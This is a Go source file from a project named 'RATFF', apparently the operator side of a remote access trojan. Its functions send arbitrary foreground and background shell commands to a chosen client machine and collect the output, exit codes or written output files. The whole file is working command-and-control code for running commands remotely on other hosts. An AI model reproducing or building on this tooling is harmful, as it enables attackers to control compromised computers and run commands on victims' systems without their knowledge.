package main

import (
	"time"

	"RATFF/shared"
)

// sendShellCommand sends a shell command to a client and waits for response.
func sendShellCommand(id string, cmd string) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   "shell_exec",
		"payload":   map[string]interface{}{"cmd": cmd},
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			stdout := ""
			stderr := ""
			exitCode := 0

			if v, ok := msg.Payload["stdout"]; ok {
				if s, ok := v.(string); ok {
					stdout = s
				}
			}
			if v, ok := msg.Payload["stderr"]; ok {
				if s, ok := v.(string); ok {
					stderr = s
				}
			}
			if v, ok := msg.Payload["exit_code"]; ok {
				if code, ok := v.(float64); ok {
					exitCode = int(code)
				} else if code, ok := v.(int); ok {
					exitCode = code
				}
			}

			PrintCommandResult(stdout, stderr, exitCode)
		}
	case <-time.After(10 * time.Second):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
	}
}

// sendBgCommand sends a background command to a client with optional output file.
func sendBgCommand(id string, cmd string, outputFile string) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   "shell_exec_bg",
		"payload": map[string]interface{}{
			"cmd": cmd,
		},
	}

	if outputFile != "" {
		payload["payload"].(map[string]interface{})["output_file"] = outputFile
	}

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		return
	}

	if outputFile != "" {
		PrintSuccess(Tf("bg_command_started_with_output", cmd, outputFile))
	} else {
		PrintSuccess(Tf("bg_command_started", cmd))
	}
}
